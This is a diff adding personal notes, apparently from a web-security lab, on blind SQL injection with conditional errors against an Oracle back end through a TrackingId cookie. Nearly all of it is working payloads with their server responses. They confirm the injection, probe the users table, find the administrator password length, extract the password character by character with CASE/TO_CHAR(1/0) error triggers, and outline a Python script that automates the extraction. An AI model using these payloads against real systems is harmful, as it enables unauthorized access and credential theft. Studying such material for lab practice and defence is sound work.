@@ -1,0 +1,109 @@
+Perform a SQLi blind with conditional error
+
+info:
+    - users table
+    - password columns
+    - username columns
+    - The cookie id is the vulnerable parameter
+
+objectives:
+    - Log in as administrator
+
+Analysis:
+
+STEP1: Prove the SQLi vuln
+
+!Payload: TrackingId=Pv5cBn0qAiqYVCyA'+||+(select+''+from+dual)+||+' -> Oracle DB
+output: 200 OK
+
+!Payload_2: TrackingId=Pv5cBn0qAiqYVCyA'+||+(select+''+from+dualblae)+||+'
+output: 500 Internal Server Error
+
+Conclusion:
+    - The Cookie parameter is vuln to SQLi
+
+--------------------------------------------
+
+STEP2: Confirm that users table exists
+
+!Payload: ' || (select '' from users where rownum = 1) || '
+output : 200 OK
+
+Conclusion:
+    - The users table exist in DB
+
+-----------------------------------------------
+
+STEP3 : Confirm that the administrator columns exist
+
+!Payload: ' || (select '' from users where username= 'administrator' ) || '
+output: 200 OK
+
+!Payload: '+||+(select+''+from+users+where+username%3d+'administratordfsdfsdf'+)+||+'
+output: 200 OK
+But we can use this query to justify if the administrator user exist in the columns because we have nothing to.
+The query will return a 200 OK anyway.
+
+Conclusion:
+    - We have to put a true / false condition to insure that the query truly exist
+
+!Payload: ' || (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username= 'administrator') || '
+output: 500 Internal Server Error
+
+!Payload: ' || (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username= 'administratorazeaze') || '
+output: 200 OK
+
+Conclusion :
+    - The Query first evaluate : "FROM users WHERE username= 'administrator'" this part of the query. If the 1st part
+of the query is True then it will look after the 2nd part of the query: "SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE ''
+END" which is FALSE, then it will display an error.
+If the first part of the query is False "FROM users WHERE username= 'administraazeaz'" it will stop here and will not
+display an error
+
+----------------------------------------
+
+STEP 4: Determine the LENGTH of admin password:
+
+BAD !Payload: ' || (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username= 'administrator' and LENGTH((password)>1) || '
+The LENGTH parameter synthax is LENGTH(password)>1
+
+GOOD !Payload: '||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+it's easier to put the True Condition in the 'SELECT CASE WHEN' part of the query
+
+Conclusion:
+    - The length of the password is 20
+
+------------------------------------------
+
+STEP 5: Determine the admin password
+
+!Payload: '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and SUBSTR(password,1,1)='a')||'
+                                                    OR
+!Payload: '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+output The first letter is a 'z'
+
+-------------------------------------------
+Scripting remarks!
+- Add the empty password variable at the beginning
+- We have to encode our payload in  ASCII : ascii(SUBSTR(password,%s,1))='%s'
+- encode the payloads the payload with urllib.parse.quote()
+- and the payload to the vuln parameter : 'Pv5cBn0qAiqYVCyA'+payload_encode
+- displays the process with:
+    if True :
+    password_extracted += chr(j)
+    sys.stdout.write('\r'+ password_extracted)
+    sys.stdout.flush()
+
+    if False:
+    sys.stdout.write('\r'+ password_extracted + chr(j))
+    sys.stdout.flush()
+
+
+
+
+
+
+
+
+
+
